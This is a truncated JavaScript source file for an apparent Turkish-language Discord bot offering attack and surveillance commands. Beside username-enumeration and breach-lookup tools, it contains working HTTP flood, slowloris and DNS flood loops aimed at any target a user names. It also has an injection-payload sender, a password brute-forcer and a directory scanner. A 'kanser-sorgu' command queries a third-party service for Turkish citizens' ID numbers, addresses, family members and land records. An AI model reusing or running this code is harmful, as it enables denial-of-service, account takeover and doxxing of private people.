import { updateInteraction, sendResponse, safeFetch, safeJSON, truncate, validateNumeric, validateURL, getUserId, validateTCKN, validateGSM, delay, sendDM } from '../utils/helpers.js';

export async function handleNewCommand(name, getOption, interaction, request, env, ctx, url) {
  switch (name) {
    case 'socmed-engelle':
      ctx.waitUntil((async () => {
        try {
          const username = getOption('kullanici');
          const platforms = [
            'Instagram', 'Twitter (X)', 'GitHub', 'Reddit', 'TikTok',
            'YouTube', 'Twitch', 'Spotify', 'Steam', 'Pinterest',
            'Medium', 'Flickr', 'DeviantArt', 'GitLab', 'Patreon',
            'TryHackMe', 'SoundCloud', 'Vimeo', 'Behance', 'Dribbble',
            'CodePen', 'Keybase', 'Goodreads', 'Last.fm', 'Fiverr',
            'Roblox', 'Chess.com', 'Lichess', 'Kaggle', 'Pastebin',
            'Wattpad', 'Bandcamp', 'BitBucket', 'Replit', 'Codewars',
            'HackerRank', 'LeetCode', 'Telegram', 'Facebook', 'LinkedIn'
          ];
          const results = await Promise.allSettled(platforms.map(async name => {
            const patterns = [
              `https://www.instagram.com/${username}/`,
              `https://twitter.com/${username}`,
              `https://github.com/${username}`,
              `https://www.reddit.com/user/${username}`,
              `https://www.tiktok.com/@${username}`,
              `https://www.youtube.com/@${username}`,
              `https://www.twitch.tv/${username}`,
              `https://open.spotify.com/user/${username}`,
              `https://steamcommunity.com/id/${username}`,
              `https://www.pinterest.com/${username}/`,
              `https://medium.com/@${username}`,
              `https://www.flickr.com/people/${username}/`,
              `https://www.deviantart.com/${username}`,
              `https://gitlab.com/${username}`,
              `https://www.patreon.com/${username}`,
              `https://tryhackme.com/p/${username}`,
              `https://soundcloud.com/${username}`,
              `https://vimeo.com/${username}`,
              `https://www.behance.net/${username}`,
              `https://dribbble.com/${username}`,
              `https://codepen.io/${username}`,
              `https://keybase.io/${username}`,
              `https://www.goodreads.com/${username}`,
              `https://www.last.fm/user/${username}`,
              `https://www.fiverr.com/${username}`,
              `https://www.roblox.com/user.aspx?username=${username}`,
              `https://www.chess.com/member/${username}`,
              `https://lichess.org/@/${username}`,
              `https://www.kaggle.com/${username}`,
              `https://pastebin.com/u/${username}`,
              `https://www.wattpad.com/user/${username}`,
              `https://bandcamp.com/${username}`,
              `https://bitbucket.org/${username}/`,
              `https://replit.com/@${username}`,
              `https://www.codewars.com/users/${username}`,
              `https://www.hackerrank.com/${username}`,
              `https://leetcode.com/${username}/`,
              `https://t.me/${username}`,
              `https://www.facebook.com/${username}`,
              `https://www.linkedin.com/in/${username}`
            ];
            const idx = platforms.indexOf(name);
            if (idx >= 0 && idx < patterns.length) {
              try {
                const ac = new AbortController(); setTimeout(() => ac.abort(), 5000);
                const r = await fetch(patterns[idx], { method: 'GET', headers: { 'User-Agent': 'Mozilla/5.0' }, signal: ac.signal });
                return r.status === 200 ? name : null;
              } catch (e) { return null; }
            }
            return null;
          }));
          const found = results.filter(r => r.status === 'fulfilled' && r.value).map(r => r.value);
          await updateInteraction(interaction.application_id, interaction.token, {
            content: `**Sosyal Medya Taramasi:** ${username}\nTaranan: ${platforms.length}\nBulunan: ${found.length} eslesme\n\n${found.length > 0 ? found.map((f, i) => `${i + 1}. ${f}`).join('\n') : 'Hicbir profil bulunamadi.'}`
          });
        } catch (err) {
          await updateInteraction(interaction.application_id, interaction.token, { content: `Sosyal medya hatasi: ${err.message}` });
        }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

    case 'ip-pool-test':
      ctx.waitUntil((async () => {
        try {
          const ip = getOption('ip');
          let result = `**IP Pool / Proxy Testi:** \`${ip}\`\n\n`;
          try {
            const ipRes = await safeFetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,isp,org,as,proxy,hosting,mobile`);
            const ipData = await ipRes.json();
            if (ipData.status === 'success') {
              result += `**Lokasyon:** ${ipData.city}, ${ipData.regionName}, ${ipData.country}\n`;
              result += `**ISP:** ${ipData.isp}\n**ASN:** ${ipData.as}\n`;
              if (ipData.proxy) result += `**Proxy/VPN:** EVET\n`;
              if (ipData.hosting) result += `**Hosting:** EVET\n`;
            }
          } catch (e) { /* ip-api.com cevap vermedi */ }
          if (env.ABUSEIPDB_API_KEY) {
            try {
              const abRes = await safeFetch(`https://api.abuseipdb.com/api/v2/check?ipAddress=${ip}&maxAgeInDays=90`, {
                headers: { 'Key': env.ABUSEIPDB_API_KEY, 'Accept': 'application/json' }
              });
              if (abRes.ok) {
                const d = (await abRes.json()).data;
                result += `\n**AbuseIPDB:** ${d.abuseConfidenceScore}% | ${d.totalReports} rapor\n`;
              }
            } catch (e) { /* AbuseIPDB erisilemedi */ }
          }
          await updateInteraction(interaction.application_id, interaction.token, { content: result });
        } catch (err) {
          await updateInteraction(interaction.application_id, interaction.token, { content: `IP test hatasi: ${err.message}` });
        }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

    case 'dijital-iz':
      ctx.waitUntil((async () => {
        try {
          const k = getOption('kullanici');
          let result = `**Dijital Ayak Izi:** ${k}\n\n`;
          try {
            const gh = await safeFetch(`https://api.github.com/users/${k}`, {
              headers: env.GITHUB_TOKEN ? { Authorization: `Bearer ${env.GITHUB_TOKEN}` } : {}
            });
            const ghData = await safeJSON(gh);
            if (ghData.login) result += `**GitHub:** ${ghData.name || 'Gizli'} | ${ghData.public_repos} repo | ${ghData.location || 'Gizli'}\n`;
          } catch (e) { /* GitHub API erisilemedi */ }
          if (env.HIBP_API_KEY) {
            try {
              const hibpRes = await safeFetch(`https://haveibeenpwned.com/api/v3/breachedaccount/${encodeURIComponent(k)}?truncateResponse=true`, {
                headers: { 'hibp-api-key': env.HIBP_API_KEY }
              });
              const hibp = await safeJSON(hibpRes);
              if (Array.isArray(hibp) && hibp.length > 0) {
                result += `**HIBP Sizintisi:** ${hibp.length} adet\n`;
                hibp.slice(0, 3).forEach(b => result += `• ${b.Name} (${b.BreachDate})\n`);
              }
            } catch (e) { /* HIBP API erisilemedi */ }
          }
          try {
            const psRes = await safeFetch(`https://psbdmp.cc/api/search/${encodeURIComponent(k)}`);
            const ps = await safeJSON(psRes);
            if (ps.count > 0) result += `**psbdmp.cc:** ${ps.count} pastebin kaydi\n`;
          } catch (e) { /* psbdmp.cc erisilemedi */ }
          await updateInteraction(interaction.application_id, interaction.token, { content: result });
        } catch (err) {
          await updateInteraction(interaction.application_id, interaction.token, { content: `Dijital iz hatasi: ${err.message}` });
        }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

    case 'email-synt':
      ctx.waitUntil((async () => {
        try {
          const domain = getOption('domain');
          const isim = getOption('isim') || '';
          let result = `**E-posta Pattern Tahmini:** ${domain}\n\n`;
          const patterns = [];
          if (isim) {
            const parts = isim.toLowerCase().trim().split(/\s+/);
            if (parts.length >= 2) {
              const ad = parts[0], soyad = parts[parts.length - 1];
              [ad, soyad, `${ad}.${soyad}`, `${ad}_${soyad}`, `${ad[0]}.${soyad}`, `${ad[0]}${soyad}`].forEach(p => patterns.push(`${p}@${domain}`));
            }
          } else {
            ['info', 'admin', 'contact', 'support', 'sales', 'help', 'mail', 'webmaster'].forEach(p => patterns.push(`${p}@${domain}`));
          }
          result += patterns.slice(0, 10).map((p, i) => `${i + 1}. \`${p}\``).join('\n');
          await updateInteraction(interaction.application_id, interaction.token, { content: result });
        } catch (err) {
          await updateInteraction(interaction.application_id, interaction.token, { content: `Pattern hatasi: ${err.message}` });
        }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

    case 'sunucu-istatistik':
      ctx.waitUntil((async () => {
        try {
          const g = interaction.guild_id;
          const guildRes = await safeFetch(`https://discord.com/api/v10/guilds/${g}`, {
            headers: { Authorization: `Bot ${env.DISCORD_TOKEN}` }
          });
          const guild = await safeJSON(guildRes);
          let result = `**Sunucu Istatistikleri**\n\n`;
          result += `**Sunucu:** ${guild.name}\n`;
          result += `**Uye:** ${guild.approximate_member_count || '?'}\n`;
          result += `**Aktif:** ${guild.approximate_presence_count || '?'}\n`;
          result += `**Boost:** ${guild.premium_tier || 0} (${guild.premium_subscription_count || 0})\n`;
          if (guild.owner_id) result += `**Sahip ID:** \`${guild.owner_id}\`\n`;
          await updateInteraction(interaction.application_id, interaction.token, { content: result });
        } catch (err) {
          await updateInteraction(interaction.application_id, interaction.token, { content: `Istatistik hatasi: ${err.message}` });
        }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

    case 'oto-moderasyon':
      ctx.waitUntil((async () => {
        try {
          const aksiyon = getOption('islem') || 'durum';
          const g = interaction.guild_id;
          let result = `**Oto-Moderasyon**\n\n`;
          const amRes = await fetch(`https://discord.com/api/v10/guilds/${g}/auto-moderation/rules`, {
            headers: { Authorization: `Bot ${env.DISCORD_TOKEN}` }
          });
          if (aksiyon === 'temizle' && amRes.ok) {
            const rules = await amRes.json();
            let s = 0;
            for (const r of rules) {
              const d = await fetch(`https://discord.com/api/v10/guilds/${g}/auto-moderation/rules/${r.id}`, {
                method: 'DELETE', headers: { Authorization: `Bot ${env.DISCORD_TOKEN}` }
              });
              if (d.ok || d.status === 204) s++;
            }
            result += `✅ ${s} kural silindi.\n`;
          } else if (aksiyon === 'ekle') {
            const c = await fetch(`https://discord.com/api/v10/guilds/${g}/auto-moderation/rules`, {
              method: 'POST',
              headers: { Authorization: `Bot ${env.DISCORD_TOKEN}`, 'Content-Type': 'application/json' },
              body: JSON.stringify({ name: 'Spam Korumasi', event_type: 1, trigger_type: 1, trigger_metadata: { keyword_filter: ['spam', '@everyone'], mention_total_limit: 5 }, actions: [{ type: 1 }], enabled: true })
            });
            result += c.ok ? '✅ Kural eklendi.\n' : `❌ Hata: ${(await c.text()).slice(0, 200)}\n`;
          } else if (amRes.ok) {
            const rules = await amRes.json();
            if (rules.length === 0) result += 'Henuz kural yok.\n';
            else rules.slice(0, 5).forEach((r, i) => result += `${i + 1}. ${r.name} ${r.enabled ? '✅' : '❌'}\n`);
          }
          await updateInteraction(interaction.application_id, interaction.token, { content: result });
        } catch (err) {
          await updateInteraction(interaction.application_id, interaction.token, { content: `Moderasyon hatasi: ${err.message}` });
        }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

    case 'gelismis-id':
      ctx.waitUntil((async () => {
        try {
          const id = getOption('id');
          if (!validateNumeric(id)) return sendResponse('Hata: Gecerli bir sayisal ID girin.', true);
          const epoch = 1420070400000n;
          const ts = (BigInt(id) >> 22n) + epoch;
          const date = new Date(Number(ts));
          let result = `**Gelismis ID Analizi:** \`${id}\`\n\n`;
          result += `**Olusturulma:** ${date.toUTCString()}\n`;
          result += `**Yas:** ${Math.floor((Date.now() - Number(ts)) / 31557600000)} yil\n`;
          const userRes = await safeFetch(`https://discord.com/api/v10/users/${id}`, {
            headers: { Authorization: `Bot ${env.DISCORD_TOKEN}` }
          });
          const user = await safeJSON(userRes);
          if (user.id) {
            result += `**Kullanici:** ${user.global_name || user.username}\n`;
            result += `**Bot:** ${user.bot ? 'Evet' : 'Hayir'}\n`;
            if (user.avatar) {
              const ext = user.avatar.startsWith('a_') ? 'gif' : 'png';
              result += `**Avatar:** [Link](https://cdn.discordapp.com/avatars/${id}/${user.avatar}.${ext}?size=256)\n`;
            }
            if (user.banner) {
              const ext = user.banner.startsWith('a_') ? 'gif' : 'png';
              result += `**Banner:** [Link](https://cdn.discordapp.com/banners/${id}/${user.banner}.${ext}?size=256)\n`;
            }
            const premium = { 0: 'Yok', 1: 'Classic', 2: 'Nitro', 3: 'Basic' };
            result += `**Nitro:** ${premium[user.premium_type] || 'Bilinmiyor'}\n`;
          } else {
            result += 'Kullanici bulunamadi veya silinmis.\n';
          }
          await updateInteraction(interaction.application_id, interaction.token, { content: result });
        } catch (err) {
          await updateInteraction(interaction.application_id, interaction.token, { content: `ID hatasi: ${err.message}` });
        }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

    // --- FLOOD KOMUTLARI ---
    case 'layer7':
      ctx.waitUntil((async () => {
        try {
          const h = getOption('hedef');
          const s = Math.min(Math.max(getOption('sure') || 5, 1), 15);
          const url = h.startsWith('http') ? h : `http://${h}`;
          const end = Date.now() + s * 1000;
          let ok = 0, block = 0;
          while (Date.now() < end) {
            await delay(100); // CPU korumasi
            await Promise.allSettled(Array.from({ length: 10 }, () =>
              fetch(`${url}/?t=${Date.now()}`, { method: 'GET', headers: { 'User-Agent': 'Mozilla/5.0' }, redirect: 'manual' })
                .then(r => r.status < 400 ? ok++ : block++)
                .catch(() => block++)
            ));
          }
          await updateInteraction(interaction.application_id, interaction.token, {
            content: `**Layer7:** ${url}\nSure: ${s}s\nBasarili: ${ok}\nEngellenen: ${block}`
          });
        } catch (err) {
          await updateInteraction(interaction.application_id, interaction.token, { content: `Layer7 hatasi: ${err.message}` });
        }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

    case 'slowloris':
      ctx.waitUntil((async () => {
        try {
          const h = getOption('hedef');
          const s = Math.min(Math.max(getOption('sure') || 10, 1), 20);
          const end = Date.now() + s * 1000;
          let n = 0;
          while (Date.now() < end) {
            await delay(100); // CPU korumasi
            const c = new AbortController();
            setTimeout(() => c.abort(), s * 1000);
            await fetch(h.startsWith('http') ? h : `http://${h}`, { method: 'GET', signal: c.signal }).catch(() => { });
            n++;
          }
          await updateInteraction(interaction.application_id, interaction.token, {
            content: `**Slowloris:** ${h}\nSure: ${s}s\nBaglanti: ${n}`
          });
        } catch (err) {
          await updateInteraction(interaction.application_id, interaction.token, { content: `Slowloris hatasi: ${err.message}` });
        }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

    case 'http-flood':
      ctx.waitUntil((async () => {
        try {
          const h = getOption('hedef');
          const s = Math.min(Math.max(getOption('sure') || 5, 1), 10);
          const m = (getOption('metod') || 'GET').toUpperCase();
          const end = Date.now() + s * 1000;
          let t = 0;
          while (Date.now() < end) {
            await delay(100); // CPU korumasi
            await Promise.allSettled(Array.from({ length: 25 }, () =>
              fetch(`${h.startsWith('http') ? h : `http://${h}`}?_=${Date.now()}`, { method: m }).catch(() => { })
            ));
            t += 25;
          }
          await updateInteraction(interaction.application_id, interaction.token, {
            content: `**HTTP Flood:** ${h}\nMetod: ${m} | Sure: ${s}s\nIstek: ${t}`
          });
        } catch (err) {
          await updateInteraction(interaction.application_id, interaction.token, { content: `HTTP flood hatasi: ${err.message}` });
        }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

    case 'dns-flood':
      ctx.waitUntil((async () => {
        try {
          const d = getOption('domain');
          const s = Math.min(Math.max(getOption('sure') || 5, 1), 10);
          const end = Date.now() + s * 1000;
          let t = 0, ok = 0;
          while (Date.now() < end) {
            await delay(100); // CPU korumasi
            try {
              const r = await fetch(`https://cloudflare-dns.com/dns-query?name=${d}&type=A`, {
                headers: { accept: 'application/dns-json' }
              });
              if (r.ok) ok++;
            } catch (e) { /* DNS sorgusu basarisiz */ }
            t++;
          }
          await updateInteraction(interaction.application_id, interaction.token, {
            content: `**DNS Flood:** ${d}\nSure: ${s}s | Istek: ${t} | Basarili: ${ok}`
          });
        } catch (err) {
          await updateInteraction(interaction.application_id, interaction.token, { content: `DNS flood hatasi: ${err.message}` });
        }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

    case 'api-crash':
      ctx.waitUntil((async () => {
        try {
          const url = getOption('url');
          const base = url.startsWith('http') ? url : `https://${url}`;
          const payloads = [
            { n: 'SQLi', p: "' OR '1'='1" },
            { n: 'XSS', p: '<script>alert(1)</script>' },
            { n: 'Path Trav', p: '../../../etc/passwd' },
            { n: 'SSRF', p: 'http://169.254.169.254/' }
          ];
          let result = `**API Crash:** ${base}\n\n`;
          let b = 0;
          for (const p of payloads) {
            try {
              const r = await fetch(`${base}${base.includes('?') ? '&' : '?'}t=${encodeURIComponent(p.p)}`, { redirect: 'manual' });
              if ([403, 406, 429].includes(r.status)) b++;
              result += `${[403, 406, 429].includes(r.status) ? '🚫' : '⚠️'} ${p.n}: ${r.status}\n`;
            } catch (e) { result += `❌ ${p.n}: Hata\n`; }
          }
          result += `\nEngellenen: ${b}/${payloads.length}`;
          await updateInteraction(interaction.application_id, interaction.token, { content: result });
        } catch (err) {
          await updateInteraction(interaction.application_id, interaction.token, { content: `API crash hatasi: ${err.message}` });
        }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

    case 'brute-force':
      ctx.waitUntil((async () => {
        try {
          const url = getOption('url');
          const user = getOption('kullanici') || 'admin';
          const kAd = getOption('k_ad') || 'username';
          const sAd = getOption('s_ad') || 'password';
          const pwds = ['123456', 'password', 'admin', '12345678', 'qwerty', 'letmein', 'welcome', 'monkey', 'dragon', 'master'];
          let result = `**Brute Force:** ${url}\nKullanici: ${user}\n\n`;
          let found = false;
          for (let i = 0; i < pwds.length; i++) {
            try {
              const fb = new URLSearchParams();
              fb.append(kAd, user); fb.append(sAd, pwds[i]);
              const r = await safeFetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: fb.toString(), redirect: 'manual'
              });
              if (r.status === 302) {
                result += `✅ Deneme ${i + 1}: ${pwds[i]} -> BASARILI!\n`;
                found = true; break;
              } else result += `❌ Deneme ${i + 1}: ${pwds[i]} -> ${r.status}\n`;
            } catch (e) { result += `❌ Deneme ${i + 1}: Hata\n`; }
          }
          result += found ? '\nSifre bulundu!' : '\nSifre bulunamadi.';
          await updateInteraction(interaction.application_id, interaction.token, { content: result });
        } catch (err) {
          await updateInteraction(interaction.application_id, interaction.token, { content: `Brute force hatasi: ${err.message}` });
        }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

    case 'dizin-tara':
      ctx.waitUntil((async () => {
        try {
          const url = getOption('url');
          const base = url.startsWith('http') ? url : `https://${url}`;
          const dirs = ['admin', 'wp-admin', 'backup', 'config', '.env', '.git', 'test', 'dev', 'api', 'uploads', 'logs', 'tmp', 'private', 'sql', 'admin.php'];
          let result = `**Dizin Taramasi:** ${base}\n\n`;
          const found = [];
          await Promise.allSettled(dirs.slice(0, 12).map(async d => {
            try {
              const ac = new AbortController(); setTimeout(() => ac.abort(), 5000);
              const r = await fetch(`${base}/${d}`, { method: 'GET', redirect: 'manual', signal: ac.signal });
              if (r.status < 400 || r.status === 403) found.push(`${d} (${r.status})`);
            } catch (e) { /* dizin erisilemedi */ }
          }));
          if (found.length > 0) result += `Bulunan (${found.length}):\n${found.join('\n')}`;
          else result += 'Acik dizin bulunamadi.';
          await updateInteraction(interaction.application_id, interaction.token, { content: result });
        } catch (err) {
          await updateInteraction(interaction.application_id, interaction.token, { content: `Dizin tarama hatasi: ${err.message}` });
        }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

    case 'kullanici-gecmis':
      ctx.waitUntil((async () => {
        try {
          const username = getOption('kullanici');
          const platforms = [
            { n: 'Instagram', u: `https://www.instagram.com/${username}/`, wm: `instagram.com/${username}` },
            { n: 'Twitter/X', u: `https://twitter.com/${username}`, wm: `twitter.com/${username}` },
            { n: 'GitHub', u: `https://github.com/${username}`, wm: `github.com/${username}` },
            { n: 'Reddit', u: `https://www.reddit.com/user/${username}`, wm: `reddit.com/user/${username}` },
            { n: 'TikTok', u: `https://www.tiktok.com/@${username}`, wm: `tiktok.com/@${username}` },
            { n: 'YouTube', u: `https://www.youtube.com/@${username}`, wm: `youtube.com/@${username}` },
            { n: 'Twitch', u: `https://www.twitch.tv/${username}`, wm: `twitch.tv/${username}` },
            { n: 'Steam', u: `https://steamcommunity.com/id/${username}`, wm: `steamcommunity.com/id/${username}` },
            { n: 'LinkedIn', u: `https://www.linkedin.com/in/${username}`, wm: `linkedin.com/in/${username}` },
            { n: 'Telegram', u: `https://t.me/${username}`, wm: `t.me/${username}` },
            { n: 'Pastebin', u: `https://pastebin.com/u/${username}`, wm: `pastebin.com/u/${username}` },
            { n: 'Spotify', u: `https://open.spotify.com/user/${username}`, wm: `spotify.com/user/${username}` }
          ];

          let result = `**Kullanici Gecmis Analizi:** \`${username}\`\n\n`;

          const profileCheck = async (p) => {
            try {
              const res = await safeFetch(p.u, { headers: { 'User-Agent': 'Mozilla/5.0' }, redirect: 'manual' }, 5000);
              const waybackRes = await safeFetch(
                `https://archive.org/wayback/available?url=${encodeURIComponent(p.u)}`,
                { headers: { 'User-Agent': 'Mozilla/5.0' } }, 5000
              );
              const wb = await safeJSON(waybackRes);
              const hasSnapshot = wb?.archived_snapshots?.closest;
              const status = res.status;
              const aktif = status === 200 ? '🟢 Aktif' : status === 404 ? '🔴 Yok' : `🟡 (${status})`;
              let satir = `**${p.n}:** ${aktif}`;
              if (hasSnapshot) {
                satir += ` | 📸 Son arsiv: ${hasSnapshot.timestamp.slice(0, 4)}-${hasSnapshot.timestamp.slice(4, 6)}-${hasSnapshot.timestamp.slice(6, 8)}`;
              }
              return satir;
            } catch (e) {
              return `**${p.n}:** ⚫ Erisilemedi`;
            }
          };

          for (let i = 0; i < platforms.length; i += 4) {
            const batch = platforms.slice(i, i + 4);
            const batchResults = await Promise.all(batch.map(p => profileCheck(p)));
            result += batchResults.join('\n') + '\n';
          }

          result += `\n📊 **Ozet:** 12 platform tarandi. 🟢=Aktif profil, 🔴=Profil yok, 📸=Wayback Machine arsivi var.`;
          result += `\n🔗 Wayback: https://web.archive.org/web/*/twitter.com/${username}`;

          await updateInteraction(interaction.application_id, interaction.token, { content: truncate(result) });
        } catch (err) {
          await updateInteraction(interaction.application_id, interaction.token, { content: `Kullanici Gecmis Hatasi: ${err.message}` });
        }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

    case 'tehdit-model':
      ctx.waitUntil((async () => {
        try {
          const domain = getOption('domain').replace(/^https?:\/\//, '').replace(/\/.*/, '').trim();
          let intel = `**Tehdit Modeli Analizi:** \`${domain}\`\n\n`;

          intel += `🔍 **Bilgi Toplaniyor...**\n`;

          const [dnsRes, crtRes, rdapRes, headersRes] = await Promise.allSettled([
            safeFetch(`https://cloudflare-dns.com/dns-query?name=${domain}&type=A`, {
              headers: { 'Accept': 'application/dns-json' }
            }, 6000).then(r => safeJSON(r)),
            safeFetch(`https://crt.sh/?q=%25.${domain}&output=json`, {
              headers: { 'User-Agent': 'Mozilla/5.0' }
            }, 8000).then(r => safeJSON(r)),
            safeFetch(`https://rdap.org/domain/${domain}`, {
              headers: { 'Accept': 'application/json', 'User-Agent': 'Mozilla/5.0' }
            }, 6000).then(r => safeJSON(r)),
            safeFetch(`https://${domain}`, {
              headers: { 'User-Agent': 'Mozilla/5.0' }, redirect: 'follow'
            }, 8000).then(r => ({ status: r.status, server: r.headers.get('server'), powered: r.headers.get('x-powered-by'), csp: r.headers.get('content-security-policy'), xframe: r.headers.get('x-frame-options'), hsts: r.headers.get('strict-transport-security'), cors: r.headers.get('access-control-allow-origin') })).catch(() => null)
          ]);

          let scanData = '';

          if (dnsRes.status === 'fulfilled' && dnsRes.value?.Answer) {
            const ips = dnsRes.value.Answer.filter(a => a.type === 1).map(a => a.data);
            scanData += `DNS A Kaydi: ${ips.join(', ')}\n`;
            if (dnsRes.value.Answer.some(a => a.type === 28)) scanData += `IPv6 (AAAA): Mevcut\n`;
            const ns = dnsRes.value.Answer?.filter(a => a.type === 2);
            if (ns?.length) scanData += `NS: ${ns.map(n => n.data).join(', ')}\n`;
          }

          if (crtRes.status === 'fulfilled' && Array.isArray(crtRes.value)) {
            const names = [...new Set(crtRes.value.slice(0, 80).map(c => c.name_value?.split('\n')).flat().filter(Boolean))];
            scanData += `SSL Sertifika Sayisi: ${crtRes.value.length}\n`;
            scanData += `Alt Alanlar (ilk 15): ${names.slice(0, 15).join(', ')}\n`;
            scanData += `Toplam Benzersiz Alt Alan: ${names.length}\n`;
          }

          if (headersRes.status === 'fulfilled' && headersRes.value) {
            const h = headersRes.value;
            scanData += `HTTP Status: ${h.status}\n`;
            if (h.server) scanData += `Server: ${h.server}\n`;
            if (h.powered) scanData += `X-Powered-By: ${h.powered}\n`;
            scanData += `CSP: ${h.csp ? '✅ Var' : '❌ YOK (XSS riski!)'}\n`;
            scanData += `HSTS: ${h.hsts ? '✅ Var' : '❌ YOK (MitM riski!)'}\n`;
            scanData += `X-Frame-Options: ${h.xframe ? '✅ Var' : '❌ YOK (Clickjack riski!)'}\n`;
            scanData += `CORS: ${h.cors === '*' ? '⚠️ Acik (*)' : h.cors ? '✅ Var' : '⚪ Yok'}\n`;
          }

          if (rdapRes.status === 'fulfilled' && rdapRes.value?.names) {
            scanData += `\nRDAP Kayitci: ${rdapRes.value.names?.[0]?.name || 'Bilinmiyor'}\n`;
          }

          intel += `\n📡 **Teknik Kesif:**\n${scanData}\n`;

          const prompt = `Sen bir siber guvenlik uzmanisin. Asagidaki domain icin kisa bir tehdit modeli analizi yap. 
Domain: ${domain}
Toplanan veriler:
${scanData}

Su basliklarda TURKCE ve KISA (her baslik 2-3 madde maks.) rapor:
1. Atak Yuzeyi (acik olan noktalar)
2. Kritik Riskler (en tehlikeli 2-3 zaafiyet)
3. Onerilen Aksiyonlar (hemen yapilmasi gerekenler)
4. CVSS Tahmini (0-10 arasi genel skor)

Toplam 400 karakteri gecme. Direkt maddelerle yaz.`;

          try {
            const aiRes = await env.AI.run('@cf/meta/llama-3.3-70b-instruct-fp8-fast', {
              messages: [{ role: 'user', content: prompt }],
              max_tokens: 500
            });
            intel += `🧠 **AI Tehdit Modeli:**\n${aiRes.response || aiRes}\n\n`;
          } catch (e) {
            intel += `🧠 **AI Analizi:** (AI modeli su anda kullanilamiyor, teknik veriler yukarida)\n`;
          }

          intel += `⚠️ *Bu rapor otomatik uretilmistir, manuel pentest yerine gecmez.*`;

          await updateInteraction(interaction.application_id, interaction.token, { content: truncate(intel) });
        } catch (err) {
          await updateInteraction(interaction.application_id, interaction.token, { content: `Tehdit Model Hatasi: ${err.message}` });
        }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

    case 'kanser-sorgu':
      ctx.waitUntil((async () => {
        try {
          const tip = getOption('tip');
          const tckn = getOption('tckn');
          const gsm = getOption('gsm');
          const ad = getOption('ad');
          const soyad = getOption('soyad');
          const il = getOption('il');
          const ilce = getOption('ilce');

          const userId = getUserId(interaction);

          let apiUrl, apiMethod, apiBody;

          const belsisHeaders = {
            'X-Requested-With': 'XMLHttpRequest',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Referer': 'https://belsis.art/',
            'Origin': 'https://belsis.art'
          };

          if (tip === 'adsoyad') {
            if (!ad && !soyad) throw new Error('Ad veya Soyad girmelisiniz.');
            apiUrl = 'https://belsis.art/api/req/adsoyad.php';
            apiMethod = 'POST';
            apiBody = new URLSearchParams();
            apiBody.append('ad', ad || '');
            apiBody.append('soyad', soyad || '');
            if (il) apiBody.append('il', il);
            if (ilce) apiBody.append('ilce', ilce);
          } else if (tip === 'gsmtc') {
            if (!validateGSM(gsm)) throw new Error('10 haneli GSM numarasi girmelisiniz.');
            apiUrl = `https://belsis.art/api/req/gsmtc.php?tckn=${encodeURIComponent(gsm)}`;
            apiMethod = 'GET';
          } else if (tip === 'vesika') {
            if (!validateTCKN(tckn)) throw new Error('11 haneli TCKN girmelisiniz.');
            apiUrl = `https://belsis.art/api/req/vesika.php?tckn=${encodeURIComponent(tckn)}`;
            apiMethod = 'GET';
          } else {
            if (!validateTCKN(tckn)) throw new Error('11 haneli TCKN girmelisiniz.');
            const endpointMap = {
              tcsorgu: 'tc',
              tcgsm: 'tcgsm',
              adres: 'tc',
              hane: 'hane',
              sokak: 'sokak',
              tapu: 'tapu',
              aile: 'aile',
              sulale: 'sülale'
            };
            const ep = endpointMap[tip];
            apiUrl = `https://belsis.art/api/req/${ep}.php?tckn=${encodeURIComponent(tckn)}`;
            apiMethod = 'GET';
          }

          const fetchOpts = { method: apiMethod, headers: belsisHeaders };
          if (apiBody) {
            fetchOpts.headers['Content-Type'] = 'application/x-www-form-urlencoded';
            fetchOpts.body = apiBody.toString();
          }

          const apiRes = await fetch(apiUrl, fetchOpts);
          if (!apiRes.ok) throw new Error(`Kanser API hatasi: ${apiRes.status}`);
          const json = await apiRes.json();

          let dmContent = `**Kanser Sorgu Sonucu**\n\n`;

          const formatTableRow = (label, value) => {
            const v = value || '-';
            return `**${label}:** ${v}`;
          };

          if (tip === 'adsoyad') {
            dmContent += `**Tip:** Ad Soyad Sorgu\n`;
            if (!json.success || !json.data || !json.data.status) {
              dmContent += 'Sonuc bulunamadi.';
            } else {
              let data = json.data.data;
              if (!Array.isArray(data)) data = Object.values(data);
              dmContent += `Toplam ${data.length} kayit:\n\n`;
              data.forEach((item, i) => {
                dmContent += `--- Kayit ${i + 1} ---\n`;
                dmContent += formatTableRow('Ad', item.ADI) + '\n';
                dmContent += formatTableRow('Soyad', item.SOYADI) + '\n';
                dmContent += formatTableRow('TCKN', item.TCKN) + '\n';
                dmContent += formatTableRow('Dogum', item.DG) + '\n';
                dmContent += formatTableRow('Il', item.SS) + '\n';
                dmContent += formatTableRow('Anne', item.ANNEADI) + '\n';
                dmContent += formatTableRow('Baba', item.BABAADI) + '\n';
                dmContent += formatTableRow('Adres', item.ADRES) + '\n\n';
              });
            }
          } else if (tip === 'tcsorgu' || tip === 'adres') {
